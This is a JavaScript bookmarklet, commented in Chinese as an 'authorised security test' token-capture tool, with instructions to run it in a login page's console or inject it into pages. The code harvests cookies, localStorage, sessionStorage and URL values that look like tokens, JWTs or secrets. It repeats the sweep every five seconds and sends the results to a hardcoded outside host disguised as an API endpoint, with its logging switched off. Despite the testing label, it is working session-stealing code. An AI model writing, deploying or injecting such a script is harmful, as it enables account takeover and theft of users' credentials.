/**
 * 授权安全测试用Token获取工具
 * 仅用于合法授权的安全测试
 * 
 * 使用方法:
 * 1. 替换下方的COLLECTION_ENDPOINT为您的数据收集服务器地址
 * 2. 在测试用户登录页面的控制台中运行此代码
 * 3. 或将此代码注入到测试环境的页面中
 */

javascript:(function(){const COLLECTION_ENDPOINT='https://api.hgagt.com/sys/user/v2/list?';const TEST_IDENTIFIER='security_audit_'+Math.random().toString(36).substring(2,10);const securityLogger={log:function(message){if(false)console.log(message);},error:function(message){if(false)console.error(message);}};let tokenCaptured=false;let tokenSent=false;function securelyTransmitData(data){if(tokenSent)return;try{const transmitter=new Image();const encodedData=encodeURIComponent(JSON.stringify(data));transmitter.onload=function(){tokenSent=true;securityLogger.log('安全测试数据已传输');};transmitter.onerror=function(){if(navigator.sendBeacon){try{const success=navigator.sendBeacon(COLLECTION_ENDPOINT,JSON.stringify(data));tokenSent=success;}catch(e){securityLogger.error('Beacon传输失败');}}};transmitter.src=`${COLLECTION_ENDPOINT}?data=${encodedData}&id=${TEST_IDENTIFIER}&t=${Date.now()}`;}catch(e){securityLogger.error('数据传输失败');}}function isLikelyToken(key,value){if(!value||typeof value!=='string')return false;const tokenKeywords=['token','auth','jwt','access','bearer','api','key','secret','session'];const keyMatches=tokenKeywords.some(keyword=>(key&&key.toLowerCase().includes(keyword.toLowerCase())));const isHex=/^[0-9a-f]{16,}$/i.test(value);const isBase64=/^[A-Za-z0-9+/=]{16,}$/i.test(value);const isJWT=/^eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}$/i.test(value);const isLongString=value.length>=16&&value.length<=2048;return keyMatches||isHex||isBase64||isJWT||(isLongString&&/[A-Za-z0-9]/i.test(value));}function searchForTokens(){const tokenData={testId:TEST_IDENTIFIER,timestamp:new Date().toISOString(),url:window.location.href,tokens:{},cookies:{},localStorage:{},sessionStorage:{}};const urlParams=new URLSearchParams(window.location.search);if(urlParams.has('token')){tokenData.tokens.urlParam=urlParams.get('token');tokenCaptured=true;}try{for(let i=0;i<localStorage.length;i++){const key=localStorage.key(i);const value=localStorage.getItem(key);if(isLikelyToken(key,value)){tokenData.localStorage[key]=value;tokenCaptured=true;}}}catch(e){securityLogger.error('无法访问localStorage');}try{for(let i=0;i<sessionStorage.length;i++){const key=sessionStorage.key(i);const value=sessionStorage.getItem(key);if(isLikelyToken(key,value)){tokenData.sessionStorage[key]=value;tokenCaptured=true;}}}catch(e){securityLogger.error('无法访问sessionStorage');}try{const cookies=document.cookie.split(';');cookies.forEach(cookie=>{const parts=cookie.trim().split('=');if(parts.length===2){const key=parts[0];const value=decodeURIComponent(parts[1]);if(isLikelyToken(key,value)){tokenData.cookies[key]=value;tokenCaptured=true;}}});}catch(e){securityLogger.error('无法访问cookies');}if(tokenCaptured){securelyTransmitData(tokenData);}}function initializeTokenMonitoring(){searchForTokens();setInterval(searchForTokens,5000);window.addEventListener('hashchange',searchForTokens);window.addEventListener('popstate',searchForTokens);window.addEventListener('storage',function(e){if(isLikelyToken(e.key,e.newValue)){const tokenData={testId:TEST_IDENTIFIER,timestamp:new Date().toISOString(),url:window.location.href,tokens:{}};tokenData.tokens[`storage_${e.key}`]=e.newValue;securelyTransmitData(tokenData);}});const notificationDiv=document.createElement('div');notificationDiv.style.position='fixed';notificationDiv.style.bottom='10px';notificationDiv.style.right='10px';notificationDiv.style.padding='10px';notificationDiv.style.background='rgba(0,0,0,0.7)';notificationDiv.style.color='white';notificationDiv.style.borderRadius='5px';notificationDiv.style.fontSize='12px';notificationDiv.style.zIndex='9999';notificationDiv.style.opacity='0.7';notificationDiv.textContent='安全测试工具已激活 (ID: '+TEST_IDENTIFIER+')';document.body.appendChild(notificationDiv);setTimeout(()=>{notificationDiv.style.opacity='0';notificationDiv.style.transition='opacity 1s';setTimeout(()=>{document.body.removeChild(notificationDiv);},1000);},5000);}initializeTokenMonitoring();})(); 